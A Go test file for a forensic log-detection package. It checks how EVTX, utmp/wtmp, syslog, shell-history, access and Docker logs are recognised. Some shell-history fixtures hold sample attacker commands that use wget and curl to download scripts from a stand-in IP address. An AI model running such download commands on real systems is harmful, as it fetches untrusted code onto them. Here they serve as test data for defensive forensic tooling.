package logs

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"unicode/utf8"
)

func TestSeverity(t *testing.T) {
	for i, n := range []string{"info", "low", "medium", "high", "critical"} {
		s, err := ParseSeverity(strings.ToUpper(n))
		if err != nil || s != Severity(i) || s.String() != n {
			t.Errorf("ParseSeverity(%q) = %v, %v", n, s, err)
		}
	}
	if _, err := ParseSeverity("severe"); err == nil {
		t.Error("unknown severity accepted")
	}
	b, err := json.Marshal(Event{Severity: High})
	if err != nil || !strings.Contains(string(b), `"severity":"high"`) {
		t.Errorf("json = %s, %v", b, err)
	}
	var e Event
	if err := json.Unmarshal(b, &e); err != nil || e.Severity != High {
		t.Errorf("round trip = %v, %v", e.Severity, err)
	}
}

func TestTruncate(t *testing.T) {
	if got := Truncate("short", 10); got != "short" {
		t.Errorf("Truncate = %q", got)
	}
	got := Truncate(strings.Repeat("è", 10), 5) // 2 bytes per rune
	if !utf8.ValidString(got) || !strings.HasSuffix(got, "…") || len(got) > 5+len("…") {
		t.Errorf("Truncate split a rune: %q", got)
	}
}

// utmpRecord builds a synthetic Linux utmp record.
func utmpRecord(typ uint16, line, user, host string) []byte {
	r := make([]byte, UtmpSize)
	binary.LittleEndian.PutUint16(r[0:], typ)
	binary.LittleEndian.PutUint32(r[4:], 4242)
	copy(r[8:40], line)
	copy(r[44:76], user)
	copy(r[76:332], host)
	binary.LittleEndian.PutUint32(r[340:], 1760216400)
	return r
}

func TestDetect(t *testing.T) {
	login := utmpRecord(7, "pts/0", "root", "203.0.113.9")
	tests := []struct {
		name string
		head string
		want Kind
	}{
		{"Security.evtx", "ElfFile\x00" + strings.Repeat("\x00", 100), KindEVTX},
		{"renamed.bin", "ElfFile\x00", KindEVTX},
		{"wtmp", string(login), KindWtmp},
		{"wtmp.1", string(login), KindWtmp},
		{"btmp", string(login), KindBtmp},
		{"btmp-20261001.gz", string(login), KindBtmp},
		{"utmp", string(login), KindUtmp},
		{"evidence.dat", string(login), KindWtmp},
		{"auth.log", "Oct 11 21:00:01 web01 sshd[812]: Accepted password for root from 203.0.113.9 port 50122 ssh2\n", KindSyslog},
		{"secure-20261011", "Oct  1 09:00:01 web01 sudo: pam_unix(sudo:session): session opened\n", KindSyslog},
		{"messages", "<34>1 2026-10-11T21:00:00.003Z web01 sshd 812 - - Failed password\n", KindSyslog},
		{"syslog", "2026-10-11T21:00:00.123456+02:00 web01 CRON[99]: (root) CMD (true)\n", KindSyslog},
		{"/home/a/.bash_history", "#1760216400\nwget http://198.51.100.7/x.sh\n", KindBashHistory},
		{`C:\triage\root\.bash_history`, "ls -la\n", KindBashHistory},
		{".zsh_history", ": 1760216400:0;curl -O http://198.51.100.7/x\n", KindZshHistory},
		{".history", ": 1760216400:0;id\n", KindZshHistory},
		{"access.log", `203.0.113.9 - - [11/Oct/2026:21:00:00 +0000] "GET / HTTP/1.1" 200 12 "-" "curl/8.5.0"` + "\n", KindAccess},
		{"abc-json.log", `{"log":"hello\n","stream":"stdout","time":"2026-10-11T21:00:00.1Z"}` + "\n", KindDocker},
		{"notes.txt", "just some notes\n", KindUnknown},
		{"auth.log", "", KindUnknown},
		{"image.png", "\x89PNG\r\n\x1a\n\x00\x00", KindUnknown},
		{"wtmp", "short", KindUnknown},
		{"auth.log", strings.Repeat("\x00", 800) + "2026-10-11T21:00:00.1+00:00 web01 sshd[1]: x\n", KindSyslog},
		{"auth.log", "Oct 11 21:00:01 web01 sshd[1]: a\n" + strings.Repeat("\x00", 3000), KindSyslog},
	}
	for _, tt := range tests {
		if got := Detect(tt.name, []byte(tt.head)); got != tt.want {
			t.Errorf("Detect(%q) = %s, want %s", tt.name, got, tt.want)
		}
	}
}

func TestDetectRejectsBinaryThatIsNotUtmp(t *testing.T) {
	bad := utmpRecord(7, "pts/0", "root", "")
	bad[10] = 0x01 // control character in ut_line
	if got := Detect("wtmp", bad); got == KindWtmp {
		t.Error("corrupt record detected as wtmp")
	}
	if !IsGzip([]byte{0x1f, 0x8b, 8}) || IsGzip([]byte("plain")) {
		t.Error("IsGzip")
	}
}

func FuzzDetect(f *testing.F) {
	f.Add("auth.log", []byte("Oct 11 21:00:01 web01 sshd[812]: test\n"))
	f.Add("wtmp", utmpRecord(7, "pts/0", "root", "x"))
	f.Add("x.evtx", []byte("ElfFile\x00"))
	f.Fuzz(func(t *testing.T, name string, head []byte) {
		k := Detect(name, head)
		if k == "" {
			t.Fatal("empty kind")
		}
	})
}

func TestScanLines(t *testing.T) {
	in := "one\r\n" + strings.Repeat("x", 200) + "\nthree \xff\n\nlast"
	var got []string
	var nums []int
	long, err := ScanLines(context.Background(), strings.NewReader(in), 100, func(n int, l string) error {
		nums = append(nums, n)
		got = append(got, l)
		return nil
	})
	if err != nil || long != 1 {
		t.Fatalf("long = %d, err = %v", long, err)
	}
	want := []string{"one", "three \uFFFD", "", "last"}
	if strings.Join(got, "|") != strings.Join(want, "|") || nums[1] != 3 || nums[3] != 5 {
		t.Errorf("lines = %q %v", got, nums)
	}
	stop := errors.New("stop")
	if _, err := ScanLines(context.Background(), strings.NewReader("a\nb\n"), 10, func(int, string) error { return stop }); err != stop {
		t.Errorf("err = %v", err)
	}
}
